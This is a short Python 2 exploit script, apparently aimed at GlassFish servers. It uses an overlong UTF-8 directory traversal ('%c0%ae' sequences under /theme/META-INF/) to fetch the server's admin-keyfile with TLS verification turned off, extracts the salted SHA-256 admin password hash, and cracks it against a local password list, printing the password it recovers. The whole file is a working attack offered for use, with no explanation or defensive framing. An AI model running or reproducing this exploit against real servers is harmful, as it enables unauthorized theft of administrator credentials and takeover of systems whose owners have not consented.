import hashlib
import base64
import ssl
import urllib2
import re
import sys
import getopt



def ssha256encoder(pwd):
	salt = b"\xfd\xc1\x5b\xb4\xdc\xa4\x03\xb7"
	pwdd = pwd+salt
	h2 = hashlib.sha256(pwdd)
	for i in range(99):
		h2 = hashlib.sha256(h2.digest())
	data = h2.digest()+salt
	return base64.b64encode(data)

def getadmin(url):
	poc = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile"
	url = url+poc
	ssl._create_default_https_context = ssl._create_unverified_context
	print url
	req = urllib2.Request(url)
	data = urllib2.urlopen(req).read()
	#print data
	user = re.match(r".*;\{.*\}(.*);.*",data,re.M|re.I)
	pwdhash = user.group(1)
	return pwdhash

def main(url):
	password_list = open('password.txt','r')
	pwd_source = getadmin(url)
	for line in password_list.readlines():
		ssha256pwd = ssha256encoder(line.strip('\n'))
		if pwd_source == ssha256pwd:
			print "password is "+line.strip('\n')+" ("+ssha256encoder(line.strip('\n'))+")"
			break
		else:
			print ssha256encoder(line.strip('\n'))+" is not password"
			continue

if __name__ == '__main__':
	opts, args = getopt.getopt(sys.argv[1:], "u:")
	for op, value in opts:
		if op == "-u":
			url = value
	main(url)
	




